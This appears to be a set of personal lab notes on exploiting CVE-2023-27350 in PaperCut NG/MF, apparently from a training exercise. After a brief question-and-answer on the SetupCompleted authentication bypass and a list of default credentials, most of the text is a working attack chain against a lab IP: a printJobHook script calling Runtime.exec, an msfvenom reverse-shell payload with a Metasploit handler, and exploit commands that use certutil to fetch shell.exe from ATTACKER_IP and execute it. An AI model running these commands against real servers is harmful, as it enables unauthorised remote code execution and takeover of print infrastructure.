## Understanding PaperCut and CVE-2023-27350


* **PaperCut NG -** their print management and control solution
* **PaperCut MF -** similar to NG but with extended copy and scan functionalities.


* **Q:** What is the name for the logic vulnerability that occurs when session and authentication functions are used for multiple purposes?
  * Session Puzzling
* **Q:** What is the name of the Java class containing the authentication bypass vulnerability?
  * SetupCompleted


## Bypassing Authentication

* **Apache** Tomcat - Authenticate with `tomcat:s3cr3t`
* **Jenkins** - Authenticate with `jenkins:jenkins`
* Almost any WiFi router - Authenticate with `admin:admin`

## WTF

http://10.10.113.105:9191/app?service=page/SetupCompleted

http://10.10.113.105:9191/app?service=page/Dashboard


```
function printJobHook(inputs, actions) {
	// your script here
}
java.lang.Runtime.getRuntime().exec('ping.exe ATTACKER_IP');
```

```
tcpdump -i ens5 icmp
```

```
git clone https://github.com/horizon3ai/CVE-2023-27350
```

```
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o shell.exe
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"
python3 CVE-2023-27350.py -u http://10.10.113.105:9191 -c "certutil.exe -urlcache -f http://ATTACKER_IP:8080/shell.exe shell.exe"

python3 CVE-2023-27350.py -u http://10.10.113.105:9191 -c "cmd.exe /c shell.exe"
```
